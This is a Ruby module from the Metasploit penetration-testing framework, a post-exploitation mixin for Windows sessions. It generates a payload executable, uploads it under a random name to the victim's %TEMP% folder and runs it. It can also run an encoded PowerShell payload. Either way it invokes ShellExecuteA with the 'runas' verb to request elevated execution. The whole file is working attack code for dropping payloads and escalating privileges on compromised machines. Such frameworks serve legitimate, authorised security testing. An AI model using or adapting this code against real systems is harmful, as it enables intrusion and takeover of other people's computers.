# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell

  def execute_exe(filename=nil,path=nil,upload=nil)
    exe_payload = generate_payload_exe
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
    payload_path = path || expand_path("%TEMP%")
    cmd_location = "#{payload_path}\\#{payload_filename}"
    if upload
      print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
      write_file(cmd_location, exe_payload)
    else
      print_error("No Upload Path!")
      return
    end
    command,args = cmd_location,nil
    shell_exec(command,args)
  end

  def execute_psh
    command,args = "cmd.exe",  " /c #{cmd_psh_payload(payload.encoded)}"
    shell_exec(command,args)
  end

  def shell_exec(command,args)
    print_status("Executing Command!")
    session.railgun.shell32.ShellExecuteA(nil,"runas",command,args,nil,5)
  end
end